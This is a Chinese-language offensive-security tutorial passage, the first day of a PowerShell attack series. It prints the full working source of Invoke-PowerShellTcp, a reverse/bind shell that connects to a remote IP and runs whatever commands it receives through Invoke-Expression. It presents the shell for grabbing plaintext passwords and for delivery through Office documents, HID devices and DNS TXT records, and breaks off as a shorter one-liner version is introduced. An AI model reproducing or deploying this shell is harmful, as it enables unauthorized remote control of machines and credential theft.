第一天：TCP交互式PowerShell脚本

让我们从一个反向shell开始。这个极棒的脚本是由Ben Turner(@benpturner)和Dave Hardy(@davehardy20)提交的。具体如何通过metasploit来使用这段脚本他们的文章有具体描述。在去除那段脚本中一些代码并修改其他若干东西后，就是我所提供的Invoke-PowerShellTcp。这个脚本可以提供主动或者被动连接的PowerShell。当前源码如下(不包含帮助文档)：

  1. function Invoke-PowerShellTcp 
  2. { 
  3.  
  4.     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
  5.  
  6.         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
  7.         [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
  8.         [String]
  9.         $IPAddress,        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
  10.         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
  11.         [Int]
  12.         $Port,        [Parameter(ParameterSetName="reverse")]
  13.         [Switch]
  14.         $Reverse,        [Parameter(ParameterSetName="bind")]
  15.         [Switch]
  16.         $Bind
  17.  
  18.     )
  19.  
  20.     #Connect back if the reverse switch is used.
  21.     if ($Reverse)
  22.     {
  23.         $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
  24.     }
  25.  
  26.     #Bind to the provided port if Bind switch is used.
  27.     if ($Bind)
  28.     {
  29.         $listener = [System.Net.Sockets.TcpListener]$Port
  30.         $listener.start()    
  31.         $client = $listener.AcceptTcpClient()
  32.     } 
  33.  
  34.     $stream = $client.GetStream()
  35.     [byte[]]$bytes = 0..255|%{0}
  36.  
  37.     #Send back current username and computername
  38.     $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
  39.     $stream.Write($sendbytes,0,$sendbytes.Length)
  40.  
  41.     #Show an interactive PowerShell prompt
  42.     $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
  43.     $stream.Write($sendbytes,0,$sendbytes.Length)
  44.  
  45.     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
  46.     {
  47.         $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding        $data = $EncodedText.GetString($bytes,0, $i)
  48.  
  49.         #Execute the command on the target.
  50.         $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
  51.  
  52.         $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
  53.         $x = ($error[0] | Out-String)
  54.         $error.clear()
  55.         $sendback2 = $sendback2 + $x
  56.  
  57.         #Return the results
  58.         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  59.         $stream.Write($sendbyte,0,$sendbyte.Length)
  60.         $stream.Flush()  
  61.     }
  62.     $client.Close()
  63.     $listener.Stop()}

使用交互式PowerShell可以在很多场合下帮助我们解决问题。一个很好的例子就是，在Windows8.1和Server 2012上面获取用户明文密码。这种情况下，我们必须要使用交互式的PowerShell。

如果你有仔细看过Invoke-PowerShellTcp的源码，你会发现源码还算比较短的，因此可以配合其他多种攻击技术使用，例如：配合微软MS Office文档 个性化界面设备(参见Kautilya)、需要下载的设备和DNS TXT记录等使用。在这些场景中使用一个短小的脚本都是不错的选择。事实上，如果去除错误处理以及格式化的用户输入代码，它还能变的更短。就是下面这段Invoke-PowerShellTcpOneLine：
